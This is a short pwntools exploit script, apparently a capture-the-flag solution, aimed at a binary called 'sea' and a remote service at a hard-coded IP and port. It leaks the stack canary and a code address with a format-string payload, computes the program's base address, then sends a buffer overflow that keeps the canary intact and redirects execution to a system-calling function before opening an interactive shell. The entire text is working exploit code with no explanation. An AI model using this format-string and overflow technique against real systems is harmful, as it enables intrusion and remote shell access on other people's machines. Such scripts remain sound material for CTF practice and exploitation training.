from pwn import *

io = connect("39.96.193.120", 10009)
io = process("./sea")
offset = 8

system_func_addr = 0x1242

payload = b"%21$p*%23$p*"

io.recvuntil(b"[Remaining Attempts: 2] > ")
io.send(payload)
canary = int(io.recvuntil(b"*")[:-1], 16)
bu_addr = int(io.recvuntil(b"*")[:-1], 16)
base_addr = bu_addr - 0x13fb

system_func_addr += base_addr

print("canary: ", hex(canary))
print("base addr: ", hex(base_addr))
print("system_func_addr: ", hex(system_func_addr))

io.recvuntil(b"[Remaining Attempts: 1] > ")
payload = b"a" * (0x70-8) + p64(canary) + b"a" * 8 + p32(system_func_addr & 0xffffffff)
print(hex(len(payload)))
io.send(payload)
io.interactive()
